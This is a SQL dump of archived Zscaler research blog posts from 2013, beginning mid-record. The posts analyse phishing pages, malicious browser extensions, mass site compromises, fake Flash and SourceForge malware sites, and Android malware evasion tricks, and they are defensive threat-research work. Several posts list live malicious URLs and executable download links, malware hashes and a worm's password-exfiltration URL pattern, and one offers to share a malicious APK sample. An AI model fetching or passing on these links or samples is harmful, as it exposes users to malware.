	  			Overrides any tab wit ha URL starting with chrome://  		  	    Thereafter, in every webpage viewed four different malicious scripts are inserted. The author uses the Google URL shortener to include the malicious JavaScript:      	http://goo.gl/9Ky9t => http://profonixcoder.com/yeni/pro.php  	http://goo.gl/gQhF6 => http://profonixcoder.com/yeni/twitter.php (down)  	http://goo.gl/t7snI => http://profonixcoder.com/yeni/youtube.php (down)  	http://goo.gl/jUEgY => http://profonixcoder.com/yeni/askfm.php (down)    Only the first script is available currently. It works on Facebook pages. It shares links using the user\'s account. By the name of the other files, we can assume they do something similar on YouTube, Twitter and Ask.fm    It looks like the author of this malicious extension doesn\'t have a high opinion of Google\'s security by using Google for hosting the extension and using their URL shortener to inject the malicious JavaScript.', 'Phishing', 'https://www.zscaler.com/blogs/research/fake-youtube-page-targets-chrome-users');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (240, 'Facebook Scam For Stalkers', 'Chris Mannon', 'May 07, 2013', 'If you are like me, you might feel bad about leaving your dog home alone all day while you are at work.  So to alleviate his boredom, I\'ve let him sign up for his own Facebook.  Being new to the social media scene has already resulted in one tragedy. Well, my dog has done it again.  This time he was paranoid over whether his girlfriend from across the street was cheating on him.  So of course when he sees the new FBStalker26.com, he must try it.         	  		  			  		  		  			On Version 26! So Advanced. So Legit.  		  	      Being a human, I know that this is obviously a phishing attempt trying to trick my dog into revealing his username and password to Facebook or worse.  Usually a Facebook scam\'s success is determined by the paranoia of who is looking at your profile or how many free iPads you can win.  Once you realize that, these phish attempts are almost elementary to recognize.         	  		  			  		  		  			Always look at the address bar before entering your creds.  		  	       The link from that photo will take you immediately to a new page where you are meant to log in again with your Facebook credentials.  A quick glance at the address bar will show you that you are not in Kansas anymore.  Don\'t do it!  Don\'t enter that information!                          Oh no you did it...Now your username/password have been compromised, they still won\'t have an easy time into your account due to higher security policies from Facebook.  Unfortunately, my dog was gullible enough to enter in his security question and answer, only to be disappointed by a 404 error immediately after that entering his data.  Looks like he\'ll never know who is stalking him now, but don\'t worry...he won\'t have access to his own Facebook account for much longer.', 'Data Breach;Malware', 'https://www.zscaler.com/blogs/research/facebook-scam-stalkers');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (241, 'Popular Media Sites Involved In Mass Compromise', 'Chris Mannon', 'May 06, 2013', 'Update (May 9): OSIRT had the opportunity to review the infected web app code for one of the compromised sites and has a great write-up to explain what was happening from a server-side vantage point.    Today, Zscaler identified yet another mass website compromise, this one impacting a number of popular media sites, including two radio stations in Washington, DC - Federal News Radio and WTOP. It\'s not clear if all of the sites impacted were leveraging a common backend platform that may have led to the compromise.    Sadly, mass compromises are now the norm. Attacks targeting end users generally involve some form of social engineering whereby the potential victim must be convinced to visit a site, download a file, etc. Attackers will therefore write a script designed to comb the web looking for popular sites exposing a common flaw and when identified, inject a single line of malicious code into the sites. In that way, any user visiting the otherwise legitimate (but now infected) site, can become a victim. This particular threat also displays another common trait - being dynamic in nature and only delivering content if the victim browser exhibits certain attributes. In this case, the injected content is only displayed when the browser\'s User Agent string reveals that Internet Explorer (IE) is being used.  When IE is used to view one of the infected pages, the following code is sent to the browser:              	  		  			  		  		  			Ofuscated JavaScript injected into a webpage at WTOP.com  		  	        	  		  			  		  		  			Deobfuscated version of the injected code  		  	    This obfuscated JavaScript decodes to reveal an iFrame pointing to sites hosted at Dynamic DNS (DynDNS) hosting providers. Thus far, we have identified two DynDNS providers (myftp.biz and hopto.org) involved and the actual URLs (which are numerous), conform to the following pattern:           \\/[a-z0-9]{14,15}\\/[a-z0-9]{32}\\/      	  		  			  		  		  			Example URL  		  	                     Once redirected to the malicious URLs, Fake AntiVirus scams and the ZeroAccess Trojan are delivered to the victim. MD5s for malware delivered include the following:                   2e1997982c4dde48a995df5061f1438f  2b150bd07bb74426d676d8cb47451fd0  62547040ac637b63c2d531e17438597a  8858050e303cca778e5083ed4e442763  eee9941e4d01b65061f4fb621b2d708d  b43c1d19d35e3606a7b6227cef561986                   Thus far, Zscaler has identified the following compromised sites:                   Media Sites                 	WTOP Radio (Washington, DC) - wtop.com  	  	Federal News Radio (Washington, DC) - federalnewsradio.com  	  	The Christian Post - christianpost.com  	  	Real Clear Science - realclearscience.com  	  	Real Clear Policy - realclearpolicy.com  	  	  	  	   	       Others      	scubaboard.com  	  	mrsec.com  	  	menupix.com  	  	xaxor.com  	  	gvovideo.com  	  	  	  	   	              At the time of posting, these compromised sites were still offering up malicious content.', 'Compromise', 'https://www.zscaler.com/blogs/research/popular-media-sites-involved-mass-compromise');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (242, 'Fake Flash Player On DropBox', 'Julien Sobrier', 'May 03, 2013', 'Fake Flash updates are leveraged as a very popular trick amongst attackers to fool users into downloading and installing malware. This week we found a three websites distributing Win32.Sanity.N malware disguised as Flash updates:       	hxxp://kivancoldu.com/, redirects to hxxp://click-videox.com/           	  		  			  		  		  			http://kivancoldu.com on 05/02/2013  		  	        	hxxp://fastcekim.com/, redirects to hxxp://click-videox.com/  	hxxp://kivanctatlitug.tk/ d(down)        	  		  			  		  		  			hxxp://kivanctatlitug.tk/  		  	    The fake warning at the top of the page alternates between English and Turkish.    What is interesting is that the malicious executables are actually hosted in a DropBox account and have not been taken down since they were found about seven days ago. I have spotted two different executables so far:      	FlashPlayer.sfx.exe (detected by only 2 of 46 AV vendors)  	Videonuizle.exe (detected by 5 of 46 AV vendors)    These two files have similar behavior. They disable all Windows features: UAC, Firewall, AV, Safe Boot, etc. The malware then drops variants of the Sality virus, some of which have a good detection rate amongst AV vendors.    Interestingly, there is a link on the malicious websites that shows how many people visited it. There were 1,412 unique visitors in a single day.       There is another peak of traffic report and on 05/02 registered 1,700 visitors...and counting.        These sites keep popping up and the are still able to fool users.', 'Malware', 'https://www.zscaler.com/blogs/research/fake-flash-player-dropbox');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (243, 'More Fake SourceForge Websites Show Up', 'Julien Sobrier', 'April 30, 2013', 'Two weeks ago we reported on a fake SourceForge website, sourceforgechile.net, which was used to distribute malware. We have since seen more of these fake sites this past week:    	sourceforgebulgaria.net, registered on 05/06/2013  	sourceforgesweden.net, registered on 05/06/2013  	sourceforgecyprus.net, registered on 05/02/2013  	sourceforgeniger.net, registered on 05/01/2013  	sourceforgeestonia.net, registered on 04/26/2013  	sourceforgegrenada.net, registered on 04/26/2013  	sourceforgepalau.net, registered on 04/22/2013  	sourceforgeecuador.net, registered on 04/21/2013  	sourceforgeindiana.net, registered on 04/20/2013  	sourceforgemorocco.net,  registered on 04/19/2013  	sourceforgemyanmar.net ,  registered on 04/19/2013  	sourceforgeyemen.net, registered on 04/06/2013    Each domain has been registered with different WHOIS information, but with the same registrar. All of them are unreachable today (DNS does not resolve).    We were however able to obtain two malicious files found from the these websites before they went dark:    	http://sourceforgeestonia.net/minecraft_xray_texture_pack.exe  	http://sourceforgeecuador.net/airport_firefighter_simulator.exe     The files are very similar to the malicious files from sourceforgechile.net which we analyzed earlier. They drop and hide malicious binaries into the Recycle Bin and are detected as the ZeroAccess Trojan.    It looks like the attacker is still registering new fake SourceForge websites. I\'ll update this post with new domain that I uncover going forward.', 'Phishing', 'https://www.zscaler.com/blogs/research/more-fake-sourceforge-websites-show');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (244, 'Scanning Binaries For PE Format Anomalies', 'ThreatLabz', 'April 26, 2013', 'After processing tons of malicous binaries, I would like to share my findings about anomalies found in PE binaries. These anomaly information will be helpful for security researchers on suspicious sample validation and sample clustering.\r\n\r\n\r\n1. Binary strings nearby EP\r\n\r\nOf course, EP binary is very popular for AV companies to work out malware signatures. So I put it at first. 81ec8001000053555633db57895c2418c74424103091400033 is most frequent EP string used by malware, which stands for stack operations. The second one is 60e803000000e9eb045d4555c3e801000000eb5dbbedffffff\r\n\r\n\r\n\r\n\r\n\r\nThis finding is pretty much similar with another research work from http://www.hexacorn.com/blog/2012/07/04/random-stats-from-300k-malicious-samples-entry-points/\r\n That article listed top-10 EP strings as the followings:\r\n\r\n \r\n\r\n \r\n\r\n\r\n    35498 55 8B EC 6A FF 68    22712 55 8B EC 83 C4 F0    14775 55 8B EC 53 8B 5D     7711 4D 5A 90 00 03 00     6959 55 8B EC 83 C4 C4     5775 4D 5A 50 00 02 00     3497 55 8B EC 83 C4 F4     3190 60 E8 00 00 00 00     3080 83 7C 24 08 01 75     2152 55 8B EC 83 C4 B4\r\n\r\n \r\n\r\n \r\n\r\n\r\n     \r\n\r\n2. Section names\r\n\r\nI concatenated each section name into a string. Here is the top ones. \r\n\r\n \r\nUPX is still the favorite packer for malware wirters, followed by UPack.\r\n\r\n\r\nThe above figure shows the values of section number in DESC order.  Most malicious samples have 3 sections.\r\n\r\nI also picked some funny section names in Chinese:\r\n天使免杀\r\n天外来客\r\n黑教基地\r\n荒山一鱼\r\nBY 小广\r\n放荡不羁挖出\r\n木马彩衣\r\n牧民战天\r\n傻傻\r\n狂少爷 \r\n\r\nHere is the longest one:\r\n\r\n国庆专版祖国大寿祖国繁荣人民安康祝福大家身体健康工作顺利合家欢乐心想事成万事如意笑脸敬上.\r\n\r\nGoogle translate results:\r\n\r\nNational Day special edition birthday of the motherland motherland\'s prosperity and people\'s well being I wish you all good health and success in your work all wishes come true and good luck. And a big smile!\r\n\r\n3. anomaly score\r\n\r\nI defined about 10 anomaly features which were used to calculate the total anomaly score.\r\nThe following is the score distribution.', 'Analysis', 'https://www.zscaler.com/blogs/research/scanning-binaries-pe-format-anomalies');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (245, 'Bitcoin: Regulations And Security', 'Julien Sobrier', 'April 26, 2013', 'You have probably heard about Bitcoin, a relatively new virtual currency. It made headlines recently because it is starting to present a real alternative for traditional online payments, and has recently experienced wild swings in value.\r\n\r\nOne of the advantages of Bitcoin is the lack of regulation, which means it is largely free from the rules and regulations that govern banks and payment processing companies when dealing with \"real\" currencies. Payment transfers are also fast and free.\r\n\r\nFor me, Bitcoin actually highlights the benefits of strong regulation, which protects consumers.\r\n\r\nYour Bitcoin Wallet is Actually Your Bank\r\n\r\nBitcoin users keep their currency in a Bitcoin \"wallet\". I think wallet is really a misnomer, it should be called a Bitcoin Bank since it holds all of the users currency, not simply want he wants to spend in the near future. A Bitcoin wallet is unsecured like a regular wallet - money can be stolen and the user as no recourse.\r\n\r\nPeople don\'t hold all their savings at home because they know that doing so is not safe. Instead, they put their savings into a bank which offers protections, including being FDIC insured. However, many Bitcoin users keep all their Bitcoins on their own computer or mobile device. They are on their own to keep their system secure and have no insurance to cover loses, whether unintentional, or due to breaches in security.\r\n\r\nThere is nothing equivalent to a credit card in the Bitcoin world. While credit cards impose a fee on all transactions, they do provide significant protection to consumers. They allow people to carry and transfer money (like the cash in a wallet), while still benefiting from the strong protection of a bank. If a personal credit card is stolen and used, the owner will be reimbursed. The owner can also dispute charges and get reimbursed quite easily if a vendor does not deliver the product or service once paid.\r\n\r\nBitcoin users bear all the risks and we\'ve already seen plenty. For example, there has been malicious software designed to steal from Bitcoin wallets. Recently, a malicious site faking a well known Bitcoin exchange contained an exploit that transferred money out of the Bitcoin wallet when users visited the site. There have also been many trojans and worms focused on stealing Bitcoins.\r\n\r\nNo Secure Bank\r\n\r\nBitcoin users can opt for storing their money in online Bitcoin Wallets. These could be construed as the equivalent of Online Banks...but without the insurance and security! Due to the absence of regulation, these online wallets don\'t have to adhere best security practices, have no audits and no certifications. It should not therefore come as a surprise that many Bitcoin online wallets have been hacked.\r\n\r\nIn one occurrence, the online Bitcoin wallet was hosted on a VPS (Virtual Private Server), which is a shared resource. This would have never been allowed for a bank. The attacker stole about $228,000 worth of Bitcoins at the time.\r\n\r\nJust this month, InstaWallet was hacked. Users lost their Bitcoins and no insurance company will be reimbursing them. All is lost, forever.\r\n\r\nWhile Bitcoin has some advantages, the risks of storing the money is just too high. Online wallets and exchanges can\'t be trusted as too many of them has shown to be run in a very unprofessional and insecure manner. Every time, the users pay the price.\r\n\r\nIf you can\'t keep your Bitcoin wallet encrypted and split onto 3 different secure USB keys in 3 different safes like the Winklevoss twins, Bitcoin is probably not for you.', 'Compromise', 'https://www.zscaler.com/blogs/research/bitcoin-regulations-and-security');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (246, 'Fake SourceForge Site Distributes Malware', 'Julien Sobrier', 'April 17, 2013', 'We spotted malware hosted on hxxp://sourceforgechile.net/ a couple of days ago. The website is not currently responding, but appears to been set up as a fake and malicious version of the popular open-source hosting site SourceForge.    sourceforgechile.net was registered on 04/05/213 in the US and is hosted in the Ukraine.    One of the malicious files downloaded was hxxp://sourceforgechile.net/minecraft_1.3.2.exe. Minecraft is a proprietary game with a significant following. Many open-source projects related to the game are hosted on SourceForge.    This file is a pretty nasty piece of malware:    	It hides itself in the Recycle Bin  	It disguises dropped files with names like Desktop.ini  	It registers itself as a Windows service  	It injects code in other threads and DLLs  	It opens and listens to a port  	It connects to about 20 IPs over port 16471  	etc.    This malware is related to the ZeroAccess trojan. The malware makes money by clicking on ads (click fraud) and using the infected PC as part of a wider botnet (zombie PC).    You can get the VirusTotal report here. The detection rate among AV vendors has gone up in the past week, it is now flagged by most vendors.    As usual, be very careful about the files you download and run. In this case, ensure that you\'re downloading content from the official SourceForge site, not a clone.', 'Analysis;AntiVirus', 'https://www.zscaler.com/blogs/research/fake-sourceforge-site-distributes-malware');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (247, 'Pinhout: Pinterest Clone Or Phishing Site?', 'Julien Sobrier', 'April 09, 2013', 'Recently I stumbled upon pinhout.com. Look familiar?      	  		  			  		  		  			Pinhout.com looks awfully familiar to...  		  	      It looks like a Turkish copy of Pinterest, a growing social network to share web content.      	  		  			  		  		  			.. Pinterest (home page).  		  	      Official site?    I was wondering if this site is a Phishing site, a clone, or an official site from Pinterest. Whois records show that the domain has been registered by a Turkish Individual:    Registrant Contact Details: Pinhout Berat Yas (duruyas@hotmail.com) Ankara Ankara Alt?nda?,06000 TR Tel. +90.0533488xxxx      The website is hosted on 95.173.164.13. This IP hosts several other domains registered by different individuals. Pinhout.com is not the default domain for this IP either (see http://95.173.164.13/). All of this tells is that this is definitely not an official localized version of Pinterest.         Phishing site?    However, the site does not look like a Phishing site either. It is fully functional and phishing sites usually clone one or two pages only. The site can be browsed without having to login. I\'ve tried to sign up with a Facebook test account, but the signup failed.  Then what is it?  The site could be used to harvest e-mail addresses, Facebook and Twitter accounts (both can be used to sign up), but that does not seem to be the case here. At least not yet...  This is either a dormant phishing/spam site, or most likely an unsanctioned clone of Pinterest by a bored programmer.                   Posted with Blogsy', 'Uncategorised', 'https://www.zscaler.com/blogs/research/pinhout-pinterest-clone-or-phishing-site');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (248, 'Gone Phishin\' On The Facebook', 'Chris Mannon', 'March 29, 2013', 'Social Media sites are rife for exploitation and malicious intent.  They have become a staple of connectivity between colleagues, family, and friends to the point that they are in many cases the focal point of communication.  Chief among these social media sites, is Facebook.  Not quite professional a network as Linkedin, not quite as informal as Twitter. Facebook is a perfect storm of chat, image host, and blurbs about how delicious your friend\'s lunch was.  Of course the information you post on these networks is what makes them so juicy a target for scammers.\r\n\r\n\r\nClickjacking is a scam technique that tricks users into clicking on something they perceive as legitimate but it is actually designed to harvest a “Like” or a click through to something malicious.\r\n\r\nThese Facebook scams don’t hide nearly as hard as you might think.  More than likely you have one in your News Feed.  So let me drop some helpful hints on how to spot a Facebook scam:\r\n\r\n \r\n\r\n \r\n\r\n\r\n	Shared/Liked a link for something clearly Not Safe for Work.\r\n	Shared/Liked a link for ANYTHING related to Free ANYTHING.  Nothing in life is free, so don’t expect it on Facebook either.\r\n	Shared/Liked a link from a less reputable source.  Example: Tommy Boy shared a link from : OMG!! COUPONS!?!1! Free Ipads and more\r\n	Shared/Liked Video or pic is displayed differently than other pic or videos.\r\n	You are tagged in a post which has other seemingly random friends also tagged along with a shortened URL.\r\n\r\n\r\n\r\nMy example today will cover 3/5 of the above so let’s get started!\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			ಠ_ಠ\r\n		\r\n	\r\n\r\n\r\n\r\nThis immediately met my criteria for suspicion.  In a secure environment, and on my Dog’s Facebook account, I was feeling comfortable to explore further without putting my personal account at risk.\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n\r\n\r\nClicking that ‘video’ link will immediately take you to a page that almost looks legitimate.  It has the Facebook navbar, but no chat bar.  To deter the more savy users from inspecting these elements further, the scammers have ensured that right-click is disabled.  The code for which looks like this:\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n\r\n\r\nCloser inspection of the source will reveal that it isn’t even a video, but an image of a video.  See:\r\n\r\nhttp://i.imgur.com/JEHTP.png\r\n\r\nhttp://i.imgur.com/KxQdy.gif\r\n\r\nFortunately for this victim, the attackers were only after his like’s and not his account or computer.  Clicking through this ‘video’ triggers a ‘LikeJacking’ attack.  So far, 160 people have fallen for this scheme.\r\n\r\nThe attacker’s goal here is not to spread malcontent and chaos, but rather to make money by scamming affiliate marketers.  A ‘Like’ on Facebook requires no two step verification to ensure that the user in question indeed clicked ‘Like’.  The harvested ‘Like’s from the scam can then be used for any purpose they desire since there is no elaboration on what is actually being endorsed.  As you see in the above screenshot, this button could be attached to anything the scammers choose to give the impression that 160 people ‘Like’d something else.\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n\r\n\r\nDigging deeper into this scam it seems unlikely that this is the only instance of this on Facebook.  I did a quick look-up on the images hosted at imgur.com and found that it was uploaded 7 months ago and has been seen 2,439,013 times at a combined bandwidth of 187.45 GB.\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n\r\n\r\nI’m no affiliate marketer, but I did some research and found that the common payout method for a pay-per-click offering should yield $290.35 a day given the time this scam has been running and the amount of views.', 'Phishing', 'https://www.zscaler.com/blogs/research/gone-phishin-facebook');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (249, 'Guess Who Am I? PE Or APK', 'ThreatLabz', 'March 15, 2013', 'Update: I happened to find this sample. However, it was corrupted.  So I made a demo file by myself. Notepad.exe was used as PE stub, and I embedded a MALICIOUS APK sample into it. So the magic number was also MZ. It ran better than the previous sample since it bypassed zipfile.py and you can see its internal apk information. \r\n\r\nIf you need this sample, leave your email or drop me a line. You are welcomed to polish its PE structure to make it runnable. Don\'t forget to let me know if you make it. Good luck!\r\n \r\nDoes \"zipfile.BadZipfile: Bad magic number for file header\" sound familiar?\r\n\r\nThis error message is caused up by zipfile.py when a file fails in the ZipFile parsing.\r\n\r\nNormally, the magic signature for a zip file is 1)\"PK\\003\\004\" , 2) \"PK\\005\\006\" (empty archive), or \"PK\\007\\008\" (spanned archieve).\r\n\r\n \r\n\r\nHere is an android example which triggers the above message. Guess what is its magic number? - 4D 5A 90 90   Yes, you are right. It is \"MZ\", the PE magic number.\r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\nThe author faked DOS header, PE header, section table, and even import table structure at the very beginning of this file so that quite a few AV engines and tools are bypassed.\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n Here is the snapshot from VT:\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n7-zip unpacked partial contents including the classes.dex and Manifest files. The classes.dex is valid. There were some ADMOB SDK APIs called, and the android payload was hidden inside .text section.\r\n\r\n\r\n\r\n\r\n\r\nThis sample ran \"su\" command to get the root privilege. Afterwards, it visited the following websites:\r\n\r\n \r\n\r\nmm.admob.com/static/android/i18n/20101109\r\n\r\n/api.admob.com/v1/pubcode/android_sdk_emulator_notice\r\n\r\n ...\r\n\r\nThis is the only sample of trying to hide APK contents inside PE format I can find so far. I am expecting more in the near future.', 'Mobile Malware', 'https://www.zscaler.com/blogs/research/guess-who-am-i-pe-or-apk');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (250, 'Hey AndroGuard, I Will Crash You Or Your Python Buddy!', 'ThreatLabz', 'March 13, 2013', 'AndroGuard is a popular tool to be used to analyze android APK files by security professionals.\r\nQuite a few APK analysis tools have been built based on it. They usually call Python library to unzip APK files before reverse-engineering. No wonder some android malware were trying to applied some anti-debugging tricks to crash AndroGuard or Python, just like what PC malware had done on Ollydbg and IDAPro.\r\n\r\nI came across a few android samples, which was able to crash (not crush) AndroGuard. I would like to share some information here.  However, I\'m not quite sure if codes inside these samples are on purpose for anti-debugging or just some bugs of AndroGuard.\r\n\r\n1.  uncommon padding values for \"link_size\" and \"link_off\" fields\r\n\r\n2. unpack function failure from Python zipfile.py\r\n\r\nHere is one example. The sample with MD5 value 22ff8b141bc187095ded6a431073028c protected itself from unzipping by AndroGuard. VT showed it as Android/Wooboo malware family.\r\n\r\n\r\n\r\nOnly 5 AV engines detected it as mailicous.\r\n\r\n\r\n\r\nThis sample caused an error by leveraging python\'s aligning on 4-byte boundaries\r\n\"unpack(\'<HH\', extra[:4]) error: unpack requires a string argument of length 4\".\r\n\r\nThis application reads the unique device ID, i.e the IMEI for GSM and the MEID or ESN for CDMA phones. It also called \'Landroid/content/Context;->getPackageName()Ljava/lang/String;\' under the tag \'Wooboo SDK\'.\r\n\r\nKudos to new patch of zipfile.py, it resolved this problem. You can download the latest version to make this patch.\r\n\r\n \r\n\r\n \r\n\r\n\r\n  def _decodeExtra(self):          # Try to decode the extra field.          extra = self.extra          unpack = struct.unpack          while len(extra) >= 4:              tp, ln = unpack(\'<HH\', extra[:4])\r\n\r\n \r\n\r\n \r\n\r\n\r\n          ..... \r\n\r\n\r\n3. Manipulate unexpected value from search_methods()\r\n\r\n For example, a malicious sample can return unexpected values from search_methods(\"Landroid/media/MediaRecorder\",\"setAudioSource\", \".\") so that\r\nint(get_register_value(1, registers)) cannot get the correct information and will crash.\r\nSome malware took advantage it to hide its \"voice/audio recording\" risk behavior.\r\nIt is the matter of how to write codes, not directly related with AndroGuard though.\r\n\r\n\r\n\r\n\r\nAnyway, if you are doing some projects based on AndroGuard, make sure to download the latest version, which was updated in Dec 2012. The authors have added some fancy features,\r\n\r\nGood job, AndroGuard guys!', 'Analysis', 'https://www.zscaler.com/blogs/research/hey-androguard-i-will-crash-you-or-your-python-buddy');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (251, 'Door-to-Door Worm Cleaner', 'Chris Mannon', 'March 08, 2013', 'Stop me if you’ve heard this one before.  I’m telling a new acquaintance that I work in IT, particularly the security sector. \r\n\r\n“Neat…so my computer has been running slow recently…” \r\n\r\nI want to make a good impression so I schedule some time and roll up my sleeves for however long it may take.  Given that this is someone else’s PC, I’m not going to risk plugging in any of my personal equipment to their network.  Instead I’ll be using only free tools that I tend to use when cleaning a PC I don’t own.  Wireshark, Bintext, Proexp are good enough starters and will help me diagnose anything I’ll need to without digging in too deep.\r\n\r\nFirst thing you want to do when looking for something malicious on a friend’s PC is check if it is actively communicating.  I fired up Wireshark and started sniffing for common things which might be getting leaked out.  Sure enough…There is a worm actively looking for new computers on the network.  From a glance you can tell that it would like nothing better than to hook itself into explorer for the purposes of keylogging.   \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nEasy enough start.  A quick look-up on VirusTotal will tell you that the MD5 associated with that dropper is more than likely an E-mail worm of some kind.  I’m inclined to agree based on some e-mail looking strings found within the same communication.\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nOnce you have a good idea about where this malicious file is hooked into, it’s a relatively simple to go to that process using ProExp and dump the malicious thread from memory.  Sure enough attached to IEEXPLORE.EXE is something called “Postcards.exe”.  One memory dump later and I think we may have found our culprit.\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\n\r\nPrior to beginning this exercise, I had set the Windows Firewall to essentially block all communication from going out aside from SMB.  It’s a good thing I did that too because this bad guy was interested in much more than just passwords.  It is also looking to profile my computer for insertion into a botnet. A leading suspicion of this activity is due to the high volume of POST requests being made to .ru sites. \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\n\r\nOnce it has spec-ed out my PC, it’s time to tell the mother ship that we have another zombie ready for the herd.  In the time I let it run, it attempted to send out information to the different sites using the same format:\r\n\r\nhxxp://www.xxxxxxxxxxxx.ru/enabling/update.jsp?password=xxxxxx&version=1.0\r\n\r\nEventually, I just installed a few different Anti-spyware cleaning products on the PC to clean it up.  When dealing with a worm this feisty, it’s a good idea to separate the nodes and clean them up one at a time if this ever happens to your personal network.', 'Malware', 'https://www.zscaler.com/blogs/research/door-door-worm-cleaner');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (252, 'Android Application Obfuscation', 'ThreatLabz', 'March 07, 2013', 'I had the opportunity to attend 2013 RSA last week. Compared with less than five vendors last year, there were more than 20 vendors focusing on mobile security. I found something interesting on android application obfuscation. Arxan was one of them. This company showcased its Mobile Application Protection Suite to protect code integrity and intellectual property from reversing engineering mobile applications. It works in the similar approach as PE packer by obfuscating codes and injecting scramble code instructions. Another vendor, Allatori, also provides similar services.\r\n\r\nWith more and more techniques of mobile app obfuscation on the market, it is possible that hackers will leverage them to mass-produce mobile malware by repackaging the obfuscation shell around known malicious codes, just like what had happened in PC threat landscape.\r\n\r\nIn this blog, I will do DEX analysis 101: reverse engineering a few repackaged samples. DEX file contains most program codes of Android application package file (APK). I use 101 Editor as the tool to view DEX files. 010 Editor offers generic interface for various types of file format. In this case, after I downloaded DEX template file and imported it into 010 Editor, I can go throug DEX format, shown as the following:\r\n \r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nOne sample was processed by zipalign so its DEX content was the same as the original file. It still had 116 strings. Other files was injected with some codes or their strings was encrypted. As the result, they showed different number of strings, methods, and even classes.\r\n\r\n\r\n\r\n\r\n\r\nAfterwards, I submitted them to Mobile Sandbox online service (www.mobile-sandbox.com) .\r\nThe output reports showed that they shared the same behavior activities.\r\n\r\nIt is a simple demo. However, the concern behind it is that we need to keep track of each application coming out of application obfuscators (by certificate?) The \"mobile packer\" software companies should work with security vendors so that the latter can determine if a submitted sample with a certain certificate is malicious or not. For more details, please refer IEEE taggant system.', 'Mobile', 'https://www.zscaler.com/blogs/research/android-application-obfuscation');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (253, 'The Move To Plugin-free Browsers', 'Julien Sobrier', 'February 22, 2013', 'Apple was the first major player to offer a browser with no plugins with Safari for iOS. Even the very popular Flash plugin cannot run in the browser. However, no vendor, including Apple, has had such restrictions on their desktop products.    Microsoft has now also gone plugin-free with Internet Explorer 10 Metro. This version of Internet Explorer does not support plugins (except for the embedded Flash plugin which is a allowed on a few whitelisted sites only). See \"Get Ready for plugin-free browsing\" for additional details.    Chrome and Firefox are also moving in the direction of plugin-free browsers too. The first step is Click to Play, which enables plugins only after an interaction from the user, not by default. With the release of Firefox 19, Mozilla has removed the need to leverage the Adobe Reader plugin by providing a JavaScript based PDF reader. Firefox is also going to enable Click to Play by default (except for Flash) in the next releases.  Blame the plugin vendors  HTML5 is helping browser vendors to get rid of some plugins, like Flash. For example, the standardization around video and sound means Flash is no longer the only option to play a video on modern browsers.    But the main drive toward plugin-free browsers is security.The latest Java vulnerabilities actively exploited and leveraged in successful attacks against Facebook and Apple, are just the latest flaws exposed in Java, Flash and Adobe Reader plugins.    Because these plugins live outside of the browser, they cannot be updated automatically by the browser vendors. Our State of the Web reports continually show that users are slow to update their plugins, even after well publicized vulnerabilities are found.    Not the end of vulnerable browsers  The end of the plugins does not mean the end of vulnerabilities in browser, just fewer of them. This month Microsoft patched about 11 security flaws. But unlike vulnerabilities in plugins which can be exploited in all browsers, browser vulns are specific to each vendor.', 'Microsoft', 'https://www.zscaler.com/blogs/research/move-plugin-free-browsers');
